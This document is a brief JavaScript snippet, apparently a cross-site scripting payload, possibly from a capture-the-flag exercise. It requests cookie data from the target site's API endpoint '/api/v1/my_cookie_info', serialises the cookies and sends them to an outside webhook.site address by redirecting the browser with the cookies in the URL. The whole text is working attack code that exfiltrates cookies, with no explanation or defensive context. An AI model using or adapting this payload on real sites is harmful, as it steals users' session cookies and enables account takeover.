fetch("/api/v1/my_cookie_info")
    .then((response) => response.json())
    .then((data) => {
        var allCookies = JSON.stringify(data.cookies);

        location.href = "https://webhook.site/4abb2b29-16db-4d83-b99e-86818bc20491?q=" + encodeURIComponent(allCookies);
    })
